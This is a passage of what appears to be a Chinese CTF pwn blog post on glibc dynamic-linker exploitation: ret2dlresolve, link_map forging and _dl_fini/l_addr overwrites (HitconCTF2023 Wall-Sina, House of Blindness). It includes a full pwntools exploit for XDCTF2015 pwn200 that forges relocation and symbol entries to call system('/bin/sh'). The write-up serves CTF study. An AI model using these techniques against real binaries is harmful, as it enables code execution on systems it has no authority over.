result;</span><br><span class="line">	DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation. */</span></span><br><span class="line">	assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Look up the target symbol. If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">		used don&#x27;t look in the global scope. */</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">	  &#123;</span><br><span class="line">		<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">	  &#123;</span><br><span class="line">		<span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum =</span><br><span class="line">		  (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">		ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">		version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">		<span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">			version = <span class="literal">NULL</span>;</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* We need to keep the scope around so do some locking. This is</span></span><br><span class="line"><span class="comment">		not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment">		we are not using any threads (yet). */</span></span><br><span class="line">		<span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">		<span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	  &#123;</span><br><span class="line">		THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">		flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">		RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">		result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">					version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* We are done with the global scope. */</span></span><br><span class="line">		<span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	  THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">		RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment">		of the object that defines sym. Now add in the symbol</span></span><br><span class="line"><span class="comment">		offset. */</span></span><br><span class="line">		value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">					SYMBOL_ADDRESS (result, sym, <span class="literal">false</span>));</span><br><span class="line">	  &#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	  &#123;</span><br><span class="line">		<span class="comment">/* We already found the symbol. The module (and therefore its load</span></span><br><span class="line"><span class="comment">address) is also known. */</span></span><br><span class="line">		value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="literal">true</span>));</span><br><span class="line">		result = l;</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* And now perhaps the relocation addend. */</span></span><br><span class="line">	value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">		&amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">	  value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Finally, fix up the plt itself. */</span></span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">		<span class="keyword">return</span> value;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* All references to the value of l_info[DT_PLTGOT],</span></span><br><span class="line"><span class="comment">l_info[DT_STRTAB], l_info[DT_SYMTAB], l_info[DT_RELA],</span></span><br><span class="line"><span class="comment">l_info[DT_REL], l_info[DT_JMPREL], and l_info[VERSYMIDX (DT_VERSYM)]</span></span><br><span class="line"><span class="comment">have to be accessed via the D_PTR macro. The macro is needed since for</span></span><br><span class="line"><span class="comment">most architectures the entry is already relocated - but for some not</span></span><br><span class="line"><span class="comment">and we need to relocate at access time. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DL_RO_DYN_SECTION</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> D_PTR(map, i) ((map)-&gt;i-&gt;d_un.d_ptr + (map)-&gt;l_addr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> D_PTR(map, i) (map)-&gt;i-&gt;d_un.d_ptr</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+<p>该函数查找函数对应的重定位表项通过:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> PLTREL *<span class="type">const</span> reloc</span><br><span class="line"> = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL])</span><br><span class="line">		+ reloc_offset (pltgot, reloc_arg));</span><br></pre></td></tr></table></figure>
+
+<p>即通过<code>link_map</code>中的<code>l_info</code>数组中的<code>DT_JMPREL</code>项找到<code>.rel.plt</code>地址，加上先前传入参数<code>reloc_arg</code>的偏移。这里的利用方法就是通过传入错误的<code>reloc_arg</code>，使其查找到我们伪造好的<code>.rel.plt</code>项，实现对重定位项的劫持，解析为我们想要的函数。</p>
+<p>由延迟绑定的机制可知，我们需要先压栈我们需要的<code>reloc_arg</code>，随后调用<code>plt0</code>。并在对应地址上伪造好<code>.rel.plt</code>，<code>dynsym</code>，<code>dynstr</code>。在<code>dynstr</code>中写入想要解析的任意函数即可。</p>
+<p>具体伪造方法以XDCTF2015 pwn200为例</p>
+<h2 id="例"><a href="#例" class="headerlink" title="例"></a>例</h2><p>题目源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>] = <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">    write(<span class="number">1</span>, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>题目为32位，只开了NX，Partial RELRO<br>由于溢出长度不够，我们先进行一次栈迁移，在已知的目标地址上写入我们的伪造项<br>exp如下:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#-*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line">from pwn import*</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"><span class="title function_">context</span><span class="params">(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">debug</span><span class="params">(cmd = <span class="string">&#x27;&#x27;):</span></span></span><br><span class="line"><span class="string"><span class="params">	if len(sys.argv)!=1:</span></span></span><br><span class="line"><span class="string"><span class="params">		return</span></span></span><br><span class="line"><span class="string"><span class="params">	cmd += &quot;&quot;&quot;</span></span></span><br><span class="line"><span class="string"><span class="params">	b system</span></span></span><br><span class="line"><span class="string"><span class="params">	&quot;&quot;&quot;</span></span></span><br><span class="line"><span class="string"><span class="params">	gdb.attach(p, cmd)</span></span></span><br><span class="line"><span class="string"><span class="params">	pause()</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">def exp(host = &quot;0.0.0.0&quot;, port=11451, exe = &quot;./vuln&quot;):</span></span></span><br><span class="line"><span class="string"><span class="params">  global p</span></span></span><br><span class="line"><span class="string"><span class="params">  if len(sys.argv)==1:</span></span></span><br><span class="line"><span class="string"><span class="params">    p = process(exe)</span></span></span><br><span class="line"><span class="string"><span class="params">  else:</span></span></span><br><span class="line"><span class="string"><span class="params">    p = remote(host, port)</span></span></span><br><span class="line"><span class="string"><span class="params">  pass</span></span></span><br><span class="line"><span class="string"><span class="params">  elf = ELF(&#x27;</span>./vuln<span class="string">&#x27;)</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  leave_ret = 0x08049105</span></span></span><br><span class="line"><span class="string"><span class="params">  pop3 = 0x080491e9</span></span></span><br><span class="line"><span class="string"><span class="params">  pop_ebp = 0x080491eb</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  write_plt = elf.plt[&#x27;</span>write<span class="string">&#x27;]</span></span></span><br><span class="line"><span class="string"><span class="params">  write_got = elf.got[&#x27;</span>write<span class="string">&#x27;]</span></span></span><br><span class="line"><span class="string"><span class="params">  read_plt = elf.plt[&#x27;</span>read<span class="string">&#x27;]</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  plt_0    = elf.get_section_by_name(&#x27;</span>.plt<span class="string">&#x27;).header.sh_addr</span></span></span><br><span class="line"><span class="string"><span class="params">  rel_plt  = elf.get_section_by_name(&#x27;</span>.rel.plt<span class="string">&#x27;).header.sh_addr</span></span></span><br><span class="line"><span class="string"><span class="params">  dynsym   = elf.get_section_by_name(&#x27;</span>.dynsym<span class="string">&#x27;).header.sh_addr     </span></span></span><br><span class="line"><span class="string"><span class="params">  dynstr   = elf.get_section_by_name(&#x27;</span>.dynstr<span class="string">&#x27;).header.sh_addr     </span></span></span><br><span class="line"><span class="string"><span class="params">  bss_addr = elf.get_section_by_name(&#x27;</span>.bss<span class="string">&#x27;).header.sh_addr</span></span></span><br><span class="line"><span class="string"><span class="params">  text_addr = elf.get_section_by_name(&#x27;</span>.text<span class="string">&#x27;).header.sh_addr</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  base_addr = bss_addr + 0x800</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  payload = b&quot;\x00&quot; * (112)</span></span></span><br><span class="line"><span class="string"><span class="params">  payload += flat([read_plt, pop3, 0, base_addr, 0x100, pop_ebp, base_addr -4, leave_ret])</span></span></span><br><span class="line"><span class="string"><span class="params">  p.recv()</span></span></span><br><span class="line"><span class="string"><span class="params">  p.send(payload)</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  reloc_index = base_addr + 24 - rel_plt </span></span></span><br><span class="line"><span class="string"><span class="params">  fake_sym_addr = base_addr + 32</span></span></span><br><span class="line"><span class="string"><span class="params">  align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span></span></span><br><span class="line"><span class="string"><span class="params">  fake_sym_addr += align</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  r_sym = int((fake_sym_addr - dynsym) / 0x10)</span></span></span><br><span class="line"><span class="string"><span class="params">  r_type = 0x7</span></span></span><br><span class="line"><span class="string"><span class="params">  r_info = (r_sym &lt;&lt; 8) + (r_type &amp; 0xff) </span></span></span><br><span class="line"><span class="string"><span class="params">  fake_reloc = flat([write_got, r_info])</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  st_name = fake_sym_addr + 0x10 - dynstr</span></span></span><br><span class="line"><span class="string"><span class="params">  st_bind = 0x1</span></span></span><br><span class="line"><span class="string"><span class="params">  st_type = 0x2</span></span></span><br><span class="line"><span class="string"><span class="params">  st_info = (st_bind &lt;&lt; 4) + (st_type &amp; 0xf)</span></span></span><br><span class="line"><span class="string"><span class="params">  fake_sym = flat([st_name, 0, 0, st_info])</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  payload = flat([plt_0, reloc_index, 0x08049196, base_addr + 0x80, 0, 0])</span></span></span><br><span class="line"><span class="string"><span class="params">  payload += fake_reloc</span></span></span><br><span class="line"><span class="string"><span class="params">  payload += b&quot;\x00&quot; * align</span></span></span><br><span class="line"><span class="string"><span class="params">  payload += fake_sym</span></span></span><br><span class="line"><span class="string"><span class="params">  payload += b&quot;system\x00&quot;</span></span></span><br><span class="line"><span class="string"><span class="params">  payload = payload.ljust(0x80, b&quot;\x00&quot;)</span></span></span><br><span class="line"><span class="string"><span class="params">  payload += flat([b&quot;/bin/sh\x00&quot;])</span></span></span><br><span class="line"><span class="string"><span class="params">  payload = payload.ljust(0x100, b&quot;\x00&quot;)</span></span></span><br><span class="line"><span class="string"><span class="params">  p.send(payload)</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">if __name__ == &#x27;</span>__main__<span class="string">&#x27;:</span></span></span><br><span class="line"><span class="string"><span class="params">	exp()</span></span></span><br><span class="line"><span class="string"><span class="params">	p.interactive()</span></span></span><br></pre></td></tr></table></figure>
+
+<p>注意dl相关函数占用较多栈空间，迁移之后可能出现栈生长到其他不可写段的情况，所以迁移的地址需要离bss足够远。</p>
+<h2 id="64位情况"><a href="#64位情况" class="headerlink" title="64位情况"></a>64位情况</h2><p>存在以下区别:</p>
+<ul>
+<li>在32位中，<code>reloc_arg</code>作为偏移量，而在64位中作为<code>.rel.plt</code>的数组下标</li>
+<li>结构体均升级为64位版本</li>
+<li>version问题<br>version问题如下<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum =</span><br><span class="line">	  (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">	ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">	version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">	<span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">		version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+此处把<code>(reloc-&gt;r_info)&gt;&gt;32</code>作为下标取值<code>vernum</code>，由于我们伪造的<code>(reloc-&gt;r_info)&gt;&gt;32</code>很大，导致容易取到不可读区域。</li>
+</ul>
+<p>解决方法之一是避免进入该循环，即使得<code>l-&gt;l_info[VERSYMIDX (DT_VERSYM)]</code>为0，地址为<code>link_map+0x1c8</code>。然而这需要泄露ld地址，都有地址了还打ret2dl就不礼貌了。</p>
+<p>另一种解决方案是选择不进入<code>if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)</code>的大循环，而是走else分支</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">	<span class="comment">/* We already found the symbol. The module (and therefore its load</span></span><br><span class="line"><span class="comment">address) is also known. */</span></span><br><span class="line">	value = DL_FIXUP_MAKE_VALUE (l, l-&gt;addr + sym-&gt;st_value);</span><br><span class="line">	result = l;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>DL_FIXUP_MAKE_VALUE</code>用于计算函数真实值。我们只需将<code>sym-&gt;st_value</code>指向某个已解析函数的got表，<code>l-&gt;addr</code>指向目标函数和已解析函数的偏移。</p>
+<p>在不泄露ld的情况下伪造<code>l-&gt;addr</code>，我们需要伪造<code>link_map</code>，一般需要满足:<br>1.<code>link_map</code>中的<code>DT_STRTAB</code>、<code>DT_SYMTAB</code>、<code>DT_JMPREL</code>可读<br>2.<code>DT_SYMTAB</code>结构体中的<code>d_ptr</code>即<code>sym</code>，<code>*(sym+5) &amp; 0x03 != 0</code><br>3.<code>(reloc-&gt;r_info)&amp;0xff == 7</code><br>4.<code>rel_addr = l-&gt;addr + reloc-&gt;r_offset</code>即原先需要修改的got表地址有可写权限<br>5.<code>l-&gt;l_addr + sym-&gt;st_value</code> 为system的地址</p>
+<h1 id="dl-fini的利用"><a href="#dl-fini的利用" class="headerlink" title="_dl_fini的利用"></a><code>_dl_fini</code>的利用</h1><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><p>该函数在ld.so中，在exit时调用，并对<code>.fini</code>和<code>.fini_array</code>中函数进行调用。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Is there a destructor function? */</span></span><br><span class="line"><span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">	|| (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>))</span><br><span class="line">  &#123;</span><br><span class="line">	<span class="comment">/* When debugging print a message first. */</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">					&amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">		_dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">		 				DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">						ns);</span><br><span class="line">	<span class="comment">/* First see whether an array is given. */</span></span><br><span class="line">	<span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">	  &#123;</span><br><span class="line">		ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">		  (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">						+ l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">						/ <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">		<span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">			((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">	  &#125;</span><br><span class="line">  </span><br><span class="line">	<span class="comment">/* Next try the old-style destructor. */</span></span><br><span class="line">	<span class="keyword">if</span> (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">		DL_CALL_DT_FINI</span><br><span class="line">			(l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里对<code>.fini_array</code>的定位是通过<code>l-&gt;l_addr+ l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code>实现的，这就给了我们操作的空间</p>
+<h2 id="HitconCTF2023-Wall-Sina"><a href="#HitconCTF2023-Wall-Sina" class="headerlink" title="HitconCTF2023 Wall-Sina"></a>HitconCTF2023 Wall-Sina</h2><p>源码如下:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buff[<span class="number">0x48</span>];</span><br><span class="line"><span class="type">void</span> *<span class="type">const</span> gift = main;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    read(STDIN_FILENO, buff, <span class="number">0x40</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buff);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>保护全开<br>栈上残留了指针<code>_rtld_global</code>和<code>_rtld_global._dl_ns[0]._ns_loaded</code>，读<code>rtld_global</code>结构体源码可知，<code>_ns_loaded</code>是结构体<code>link_map</code>的指针<br>故我们可以通过fmt任意写在<code>link_map</code>的第一项，也就是<code>l_addr</code>处写任意地址。<br>题目在<code>.data.rel</code>保留了一个main的指针，且在<code>.fini_array</code>后不远处，故我们可以改写<code>l_addr</code>的LSB，使<code>l-&gt;l_addr+ l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code>指向该指针，达成第二次fmt。在泄露各地址之后还能再该<code>l_addr</code>使<code>.fini</code>定位到main达成第三次fmt。</p>
+<h2 id="House-of-Blindness"><a href="#House-of-Blindness" class="headerlink" title="House of Blindness"></a>House of Blindness</h2><p>该手法无需泄露地址，需要mmap相关的任意写</p>
+<p>依旧是改写<code>l_addr</code>的LSB，使<code>l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr</code>指向目标函数。然而<code>.dynamic</code>很大，超过了256bytes，这意味着可能需要爆破一个byte。</p>
+<p>该手法给出了不用爆破的解决方案。使用<code>.dynamic</code>段中的<code>DT_DEBUG</code>项。该项指向了一个位于ld.so中的<code>_r_debug</code>结构，且有可写权限，可以通过覆盖LSB达成对libc函数的调用。<br>由于ld.so地址在libc.so之后，地址显然更大，可以将<code>l_addr</code>改为负数(补码形式)来解决。<br>另外，此时的rdi正好落在<code>dl_load_lock</code>上，位于ld.so中，也是可控的。</p>
+<hr>
+<p>参考资料:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-253833.htm#msg_header_h2_2">[看雪]dl_runtime_resolve结合源码分析及常见的几种攻击手法</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/firmianay/CTF-All-In-One/blob/master/doc/6.1.3_pwn_xdctf2015_pwn200.md">CTF-All-In-One</a></li>
+<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/657009223">[知乎]HitconCTF2023 pwn Wall-Sina wp</a></li>
+<li><a target="_blank" rel="noopener" href="https://hackmd.io/jmE0VvcTQaaJm6SEWiqUJA#refining-our-exploit-with-_r_debug">[Hackmd]house of blindness</a></li>
+<li>《程序员的自我修养》</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/DeePunk42">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
